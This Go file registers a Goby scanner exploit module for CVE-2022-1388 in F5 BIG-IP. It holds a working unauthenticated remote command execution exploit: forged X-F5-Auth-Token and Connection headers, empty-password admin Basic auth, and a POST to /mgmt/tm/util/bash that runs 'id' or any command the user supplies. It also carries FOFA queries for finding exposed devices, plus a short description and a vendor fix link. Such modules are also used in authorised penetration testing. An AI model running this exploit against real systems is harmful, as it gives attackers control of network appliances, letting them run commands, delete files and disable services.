package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
  "Name": "F5-BIG-IP-login-bypass-CVE-2022-1388",
  "Description": "<p>BIG-IP 是 F5 公司的一款应用交付服务是面向以应用为中心的世界先进技术。借助 BIG-IP 应用程序交付控制器保持应用程序正常运行。BIG-IP 本地流量管理器 (LTM) 和 BIG-IP DNS 能够处理应用程序流量并保护基础设施。</p>",
  "Product": "BIG-IP",
  "Homepage": "https://fofa.so/",
  "DisclosureDate": "2022-05-11",
  "Author": "",
  "FofaQuery": "body=\"F5 Networks, Inc\"",
  "GobyQuery": "body=\"F5 Networks, Inc\"",
  "Level": "3",
  "Impact": "<p><span style=\"color: rgb(77, 77, 77); font-size: 16px;\">未经身份验证的攻击者可以通过管理端口或自身 IP 地址对 BIG-IP 系统进行网络访问，执行任意系统命令、创建或删除文件或禁用服务。</span><br></p>",
  "Recommendation": "<p><span style=\"color: rgb(77, 77, 77); font-size: 16px;\">参考漏洞影响范围，目前F5官方已给出解决方案，可升级至不受影响版本或参考官网文件进行修复&nbsp;</span></p><p><a href=\"https://support.f5.com/csp/article/K23605346\">https://support.f5.com/csp/article/K23605346</a><br></p>",
  "References": [
    "https://fofa.so/"
  ],
  "Is0day": false,
  "HasExp": true,
  "ExpParams": [
    {
      "name": "command",
      "type": "input",
      "value": "id",
      "show": ""
    }
  ],
  "ExpTips": {
    "Type": "",
    "Content": ""
  },
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/mgmt/tm/util/bash",
        "follow_redirect": true,
        "header": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
          "X-F5-Auth-Token": "a",
          "Connection": "Keep-Alive, X-F5-Auth-Token",
          "Authorization": "Basic YWRtaW46",
          "Content-Type": "application/json"
        },
        "data_type": "text",
        "data": "{\"command\": \"run\", \"utilCmdArgs\": \"-c 'id'\"}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          },
          {
            "type": "item",
            "variable": "$body",
            "operation": "contains",
            "value": "uid=",
            "bz": ""
          }
        ]
      },
      "SetVariable": []
    }
  ],
  "ExploitSteps": [
    "AND",
    {
      "Request": {
        "method": "POST",
        "uri": "/mgmt/tm/util/bash",
        "follow_redirect": true,
        "header": {
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
          "X-F5-Auth-Token": "a",
          "Connection": "Keep-Alive, X-F5-Auth-Token",
          "Authorization": "Basic YWRtaW46",
          "Content-Type": "application/json"
        },
        "data_type": "text",
        "data": "{\"command\": \"run\", \"utilCmdArgs\": \"-c '{{{command}}}'\"}"
      },
      "ResponseTest": {
        "type": "group",
        "operation": "AND",
        "checks": [
          {
            "type": "item",
            "variable": "$code",
            "operation": "==",
            "value": "200",
            "bz": ""
          }
        ]
      },
      "SetVariable": [
        "output|lastbody||"
      ]
    }
  ],
  "Tags": [
    "命令执⾏"
  ],
  "VulType": [
    "命令执⾏"
  ],
  "CVEIDs": [
    "CVE-2022-1388"
  ],
  "CNNVD": [
    ""
  ],
  "CNVD": [
    ""
  ],
  "CVSSScore": "",
  "Translation": {
    "CN": {
      "Name": "F5-BIG-IP-login-bypass-CVE-2022-1388",
      "Product": "BIG-IP",
      "Description": "<p>BIG-IP 是 F5 公司的一款应用交付服务是面向以应用为中心的世界先进技术。借助 BIG-IP 应用程序交付控制器保持应用程序正常运行。BIG-IP 本地流量管理器 (LTM) 和 BIG-IP DNS 能够处理应用程序流量并保护基础设施。</p>",
      "Recommendation": "<p><span style=\"color: rgb(77, 77, 77); font-size: 16px;\">参考漏洞影响范围，目前F5官方已给出解决方案，可升级至不受影响版本或参考官网文件进行修复&nbsp;</span></p><p><a href=\"https://support.f5.com/csp/article/K23605346\">https://support.f5.com/csp/article/K23605346</a><br></p>",
      "Impact": "<p><span style=\"color: rgb(77, 77, 77); font-size: 16px;\">未经身份验证的攻击者可以通过管理端口或自身 IP 地址对 BIG-IP 系统进行网络访问，执行任意系统命令、创建或删除文件或禁用服务。</span><br></p>",
      "VulType": [
        "命令执⾏"
      ],
      "Tags": [
        "命令执⾏"
      ]
    },
    "EN": {
      "Name": "F5-BIG-IP-login-bypass-CVE-2022-1388",
      "Product": "",
      "Description": "<p style=\"text-align: justify;\">Big-ip is an application delivery service from F5 that is geared towards the world of application-centric advanced technology.&nbsp;Keep the application running with big-IP application delivery controller.&nbsp;Big-ip Local Traffic Manager (LTM) and Big-IP DNS can handle application traffic and secure the infrastructure.</p><p style=\"text-align: justify;\"></p><p style=\"text-align: justify;\">An unauthenticated attacker can use the management port or its own IP address to access the big-IP system, execute any system command, create or delete files, or disable services.</p>",
      "Recommendation": "",
      "Impact": "",
      "VulType": [],
      "Tags": []
    }
  },
  "AttackSurfaces": {
    "Application": null,
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}